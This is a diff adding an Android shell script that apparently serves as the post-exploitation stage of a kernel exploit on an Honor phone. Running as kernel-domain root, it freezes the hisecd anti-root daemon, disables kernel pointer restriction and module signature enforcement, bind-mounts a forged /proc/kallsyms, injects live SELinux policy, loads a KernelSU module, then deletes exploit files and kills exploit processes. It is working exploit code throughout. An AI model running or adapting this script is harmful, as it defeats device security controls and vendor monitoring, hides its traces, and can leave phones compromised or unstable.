@@ -1,0 +1,122 @@
+#!/system/bin/sh
+# Autonomous KSU late-load (KSU_LOADER mode). Runs in the exploit's anchor
+# context (root, kernel domain, no seccomp).
+export PATH=/system/bin:/system/xbin:/vendor/bin:$PATH
+RD=@RUNDIR@
+OUT=$RD/ksu_load.log
+> $OUT
+{
+  echo "=== loader start ==="; id; getenforce; cut -d. -f1 /proc/uptime
+  echo "=== preserve crash evidence from previous rundirs (BEFORE anything risky) ==="
+  # previous runs' kmsg_cap/ksu_load are kernel-context-written and unreadable
+  # to shell under enforcing; WE are kernel-domain root and can read them. Copy
+  # into THIS rundir before the GC below deletes the old dirs.
+  for d in $(ls -d /data/local/tmp/ksu_run_* 2>/dev/null | grep -v "@STAMP@"); do
+    b=$(basename $d)
+    cp $d/kmsg_cap.txt $RD/prev_kmsg_$b.txt 2>/dev/null && echo "preserved $b/kmsg_cap.txt"
+    cp $d/ksu_load.log $RD/prev_load_$b.log 2>/dev/null && echo "preserved $b/ksu_load.log"
+  done
+  cp /sys/fs/pstore/* $RD/ 2>/dev/null && ls $RD/*pstore* $RD/console-ramoops* 2>/dev/null
+  echo "=== runtime env (slide-derived addrs from exploit parent) ==="
+  for i in $(seq 1 100); do [ -s $RD/ksu_runtime.env ] && break; sleep 1; done
+  . $RD/ksu_runtime.env
+  echo "COMMIT_CRED_RT=$COMMIT_CRED_RT BOOTID_CTL_RT=$BOOTID_CTL_RT BOOTID_BUF_RT=$BOOTID_BUF_RT"
+  cat /proc/iomem > $RD/iomem.txt 2>/dev/null   # phys-base sampler, streamed off-device by the host watch
+  echo "=== wait for parent sig_enforce walk (it runs concurrently) ==="
+  sv=$(cat /sys/module/module/parameters/sig_enforce 2>/dev/null)
+  i=0
+  while [ "$sv" != "N" ] && [ "$sv" != "0" ] && [ $i -lt 150 ]; do sleep 1; sv=$(cat /sys/module/module/parameters/sig_enforce 2>/dev/null); i=$((i+1)); done
+  echo "sig_enforce=$sv after ${i}s"
+  if [ "$sv" != "N" ] && [ "$sv" != "0" ]; then echo "sig never flipped — ABORT (EKEYREJECTED would follow)"; echo "NOTE: boot_id stays hijacked (no .ko restore) — REBOOT MANDATORY"; echo KSU_LOAD_DONE; exit 1; fi
+  # HISEC antiroot: hisecd runs a "static check" + mod-sign RISK threat
+  # upload seconds before every post-land hard reset. Freeze it (SIGSTOP,
+  # init-safe) for the load window ONLY — a hisecd left frozen wedges Honor's
+  # periodic root scan (system_server blocks ~85s on it) -> daily watchdog
+  # soft-reboots. The tail of this script SIGCONTs it again.
+  if [ @FREEZE_HISECD@ = 1 ]; then hp=$(pidof hisecd); [ -n "$hp" ] && kill -STOP $hp && echo "hisecd FROZEN pid=$hp"; fi
+  echo "=== kptr dance + fake kallsyms (PREPEND commit_creds) ==="
+  KR=$(cat /proc/sys/kernel/kptr_restrict); echo "kptr was=$KR"
+  echo 0 > /proc/sys/kernel/kptr_restrict
+  echo "${COMMIT_CRED_RT#0x} T commit_creds" > $RD/kallsyms_add.txt
+  cat /proc/kallsyms > $RD/real_ks.tmp
+  cat $RD/kallsyms_add.txt $RD/real_ks.tmp > $RD/fake_kallsyms
+  echo "addendum: $(cat $RD/kallsyms_add.txt) (fake lines=$(wc -l < $RD/fake_kallsyms))"
+  # abort-path cleanup: every exit AFTER this point must thaw hisecd and
+  # restore sig_enforce / kptr_restrict. sig_enforce was flipped to 0 by the
+  # parent route; sysfs accepts writing 1 back.
+  if ! mount --bind $RD/fake_kallsyms /proc/kallsyms; then
+    echo "bind-mount FAIL"
+    echo $KR > /proc/sys/kernel/kptr_restrict 2>/dev/null
+    echo 1 > /sys/module/module/parameters/sig_enforce 2>/dev/null
+    [ -n "$hp" ] && kill -CONT $hp 2>/dev/null && echo "hisecd thawed on abort"
+    echo "NOTE: boot_id stays hijacked (no .ko restore) — REBOOT MANDATORY"
+    echo KSU_LOAD_DONE; exit 1
+  fi
+  echo "=== policy injection (single shot, before module load) ==="
+  $RD/magiskpolicy --apply $RD/ksu_rules --live 2>&1
+  echo "magiskpolicy exit=$?"
+  ctx=$(/system/bin/sh -c 'cat /proc/self/attr/current' 2>/dev/null)
+  if [ -z "$ctx" ]; then
+    echo "HEALTH GATE FAILED after policy injection (attr/current unresolvable) — ABORT before module load"
+    umount /proc/kallsyms 2>/dev/null; echo $KR > /proc/sys/kernel/kptr_restrict 2>/dev/null
+    echo 1 > /sys/module/module/parameters/sig_enforce 2>/dev/null
+    [ -n "$hp" ] && kill -CONT $hp 2>/dev/null && echo "hisecd thawed on abort"
+    echo "NOTE: boot_id stays hijacked (no .ko restore) — REBOOT MANDATORY"
+    echo KSU_LOAD_DONE; exit 1
+  fi
+  echo "policy injected OK (ctx=$ctx)"
+  echo "=== load_ko (init_module flags=0) ==="
+  PO=$(cat /proc/sys/kernel/panic_on_oops 2>/dev/null); PO=${PO:-1}
+  echo "panic_on_oops(before)=$PO"
+  echo 0 > /proc/sys/kernel/panic_on_oops 2>&1
+  $RD/kmsg_dumper $RD/kmsg_cap.txt &
+  KMSG_PID=$!
+  sleep 1
+  if [ @ALLOW_SHELL@ = 1 ]; then KSU_PARAMS="allow_shell=1 "; else KSU_PARAMS=""; fi
+  KSU_PARAMS="${KSU_PARAMS}h80gt_bootid_ctl=$BOOTID_CTL_RT h80gt_bootid_buf=$BOOTID_BUF_RT"
+  echo "ksu params: $KSU_PARAMS"
+  $RD/load_ko $RD/kernelsu.ko "$KSU_PARAMS" > $RD/loadko_result.log 2>&1
+  echo "load_ko_exit=$?"
+  sync; sleep 2
+  grep -i kernelsu /proc/modules 2>&1 || echo "(no kernelsu in /proc/modules)"
+  echo "=== loadko_result.log ==="; cat $RD/loadko_result.log 2>&1
+  echo "=== KSU userspace bring-up ==="
+  if grep -qi kernelsu /proc/modules && [ @STAGES@ = 1 ]; then
+    $RD/ksud post-fs-data 2>&1; echo "pfd=$?"
+    $RD/ksud services 2>&1; echo "svc=$?"
+    $RD/ksud boot-completed 2>&1; echo "bc=$?"
+    $RD/ksud install 2>&1; echo "install=$?"
+    ls -la /data/adb/ksud 2>&1
+  else
+    echo "module missing or KSU_STAGES=0 — skipping stages"
+    grep -qi kernelsu /proc/modules || echo "NOTE: no .ko loaded -> boot_id stays hijacked (no restore) — REBOOT MANDATORY"
+  fi
+  echo "=== restore hardening knobs (BEFORE enforce!) ==="
+  echo $PO > /proc/sys/kernel/panic_on_oops 2>&1 && echo -n "panic_on_oops=" && cat /proc/sys/kernel/panic_on_oops 2>&1
+  echo 1 > /sys/module/module/parameters/sig_enforce 2>&1 && echo -n "sig_enforce=" && cat /sys/module/module/parameters/sig_enforce 2>&1
+  umount /proc/kallsyms 2>&1 && echo "umount OK"
+  echo $KR > /proc/sys/kernel/kptr_restrict 2>&1 && echo "kptr restored=$KR"
+  echo "=== GC stale poisoned inodes + old rundirs ==="
+  rm -f /data/local/tmp/{diag.sh,h80gt_exploit,h80gt_sysctl.log,kallsyms_add.txt,kernelsu.ko,kernelsu_neutered.ko,kmsg_dumper,ksu.rules,ksu_dev_inject.sh,ksu_dev_loader.sh,ksud,ksud_help.txt,load_ko,loadko_result.log,magiskpolicy,neut.sh,neut_result.log,policy_after_full.bin,result.done,ksu_rules} 2>&1
+  ls -d /data/local/tmp/ksu_run_* 2>/dev/null | grep -v "@STAMP@" | while read d; do rm -rf "$d"; done
+  echo "GC done"
+  echo "=== process cleanup (immediate) ==="
+  pkill -9 -f 'h80gt_ex[p]loit' 2>/dev/null; echo "exploit remnants swept"
+  kill $KMSG_PID 2>/dev/null; pkill -f ksucmdwatch 2>/dev/null
+  echo "kmsg_dumper + cmd watcher stopped"
+  echo "=== thaw hisecd (a frozen hisecd wedges Honor's periodic ==="
+  echo "=== root scan -> daily system_server watchdog soft-reboots) ==="
+  if [ @FREEZE_HISECD@ = 1 ] && [ -n "$hp" ]; then
+    kill -CONT $hp 2>/dev/null && echo "hisecd THAWED pid=$hp"
+  fi
+  : > ${RD%/*}/result.done 2>/dev/null   # end-marker for host-side poll loops (written pre-enforce, while kernel-domain opens still work)
+  if grep -qi kernelsu /proc/modules && [ @ENFORCE@ = 1 ]; then
+    echo "=== enforce SELinux (ABSOLUTE LAST: builtins only from here) ==="
+    echo 1 > /sys/fs/selinux/enforce 2>&1
+    read EBACK < /sys/fs/selinux/enforce 2>&1; echo "enforce readback=$EBACK"
+  else
+    echo "KSU_ENFORCE=0 or module missing — leaving permissive"
+  fi
+  echo "=== final ==="; grep -i kernelsu /proc/modules 2>&1; cut -d. -f1 /proc/uptime
+} >> $OUT 2>&1
+echo "KSU_LOAD_DONE $OUT"
